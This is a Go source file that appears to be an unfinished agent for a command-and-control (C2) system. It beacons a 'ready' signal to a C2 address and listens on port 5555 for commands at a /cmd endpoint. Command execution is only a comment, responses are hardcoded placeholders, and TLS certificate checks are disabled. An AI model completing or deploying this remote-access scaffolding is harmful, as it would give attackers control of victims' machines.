package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// answer = (command)+(Key menager)+(Key client)+(answer) string
type Contact struct {
	Ip     string
	Port   string
	System string //os
	Key    string //new programm -> new individual key for autorizaiton (make with time and load main function) // ManagerKey string
	Date   time.Time
}
type Answer struct {
	IP          string
	Command     string
	Key_Manager string
	Key_Client  string
	Result      string
}

func findLocalAddress(ips []net.IP) []string {
	//192.168.0.?
	//10.?.?.?
	var LocalIps []string
	for _, ip := range ips {
		ipStr := ip.String()
		octet_array := strings.Split(ipStr, ".")
		for i, octet := range octet_array {
			octet_int, _ := strconv.Atoi(octet)
			if octet_int == 192 {
				octet_int_two, _ := strconv.Atoi(octet_array[i+1])
				octet_int_three, _ := strconv.Atoi(octet_array[i+2])
				if octet_int_two == 168 && octet_int_three == 0 {
					LocalIps = append(LocalIps, ipStr)
					break
				}
			}
			if octet_int == 10 {
				LocalIps = append(LocalIps, ipStr)
			}

		}

	}
	return LocalIps
}

func GetIPs() []net.IP {
	ifaces, _ := net.Interfaces()
	var ips []net.IP
	// handle err
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		// handle err
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ips = append(ips, ip)
			//fmt.Println(ip)
			//fmt.Println(addrs) read ip with mask

		}
	}
	return ips
}

// port of c2 - 1234
func main() {
	ip_addr := flag.String("ip", "localhost", "ip addres of c2")
	//endpoint := flag.String("endpoint", "", "endpoint c2")

	flag.Parse()

	//sendReadySignal(ip_addr)

	go sendReadySignal(ip_addr)
	startServer()

}
func sendReadySignal(ip *string) {
	c2_addr := "https://" + *ip + ":443/ready"
	local_ips := GetIPs()
	fmt.Println(local_ips)
	//local_IP := findLocalAddress(local_ips)[0] - After coming set
	link := "https://localhost:443/ready"

	fmt.Printf(c2_addr)
	fmt.Printf("\n")
	// body := strings.NewReader(fmt.Sprintf(`
	// {
	// 	"Ip":"%s",
	// 	"Port":"%s",
	// 	"System":"%s",
	// 	"Key":"%s",
	// 	"Date":"%s"
	// }
	// `, local_IP, "5555", "Windows", "123456789", time.Now().String()))

	// resp, err := http.Post(c2_addr, "application/json", body)
	// if err != nil {
	// 	fmt.Printf("Error with post request")
	// }
	// resp.Body.Close()
	// fmt.Printf("Status: " + resp.Status + "\n")
	body := fmt.Sprintf(`
	{
		"Ip":"%s",
		"Command":"%s",
		"Key_Manager":"%s",
		"Key_Client":"%s",
		"Result":"%s"
	}
	`, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	response, err := client.Post(link, "application/json", bytes.NewBufferString(body))
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	content, _ := ioutil.ReadAll(response.Body)
	s := strings.TrimSpace(string(content))
	fmt.Printf(s)
}

// Server
func SendAnswer() {
	//Before needs execute the cmd

	link := "https://localhost:443/answer"
	fmt.Printf("\n")
	fmt.Printf("Sending answer")
	// body := strings.NewReader(fmt.Sprintf(`
	// {
	// 	"Ip":"%s",
	// 	"Command":"%s",
	// 	"Key_Manager":"%s",
	// 	"Key_Client":"%s",
	// 	"Result":"%s"
	// }
	// `, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list"))
	body := fmt.Sprintf(`
	{
		"Ip":"%s",
		"Command":"%s",
		"Key_Manager":"%s",
		"Key_Client":"%s",
		"Result":"%s"
	}
	`, "192.168.0.1", "ls -la", "nil", "123456789", "Directory list")
	/*
		resp, err := http.Post("https://localhost:443/answer", "application/json", body)
		if err != nil {
			fmt.Printf("Error with post request")
		}
		resp.Body.Close()
		fmt.Printf("Status: " + resp.Status + "\n")
	*/
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	//response, err := client.Get(link)
	response, err := client.Post(link, "application/json", bytes.NewBufferString(body))
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	content, _ := ioutil.ReadAll(response.Body)
	s := strings.TrimSpace(string(content))
	fmt.Printf(s)
}
func startServer() {
	fmt.Printf("Server started")
	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
		fmt.Printf("cmd endpoint \n")
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		cmd := r.URL.Query().Get("m")

		fmt.Printf(cmd)
		w.Header().Set("Content-Type", "application/json")
		//exec the command

		fmt.Printf("\n")
		fmt.Printf("Sending answer")
		body := Answer{
			IP:          "192.168.0.1",
			Command:     "ls",
			Key_Manager: "h23rg2vyr672",
			Key_Client:  "dfheuf32f2",
			Result:      "Directory",
		}

		json.NewEncoder(w).Encode(body)
	})

	http.ListenAndServe(":5555", nil)
}
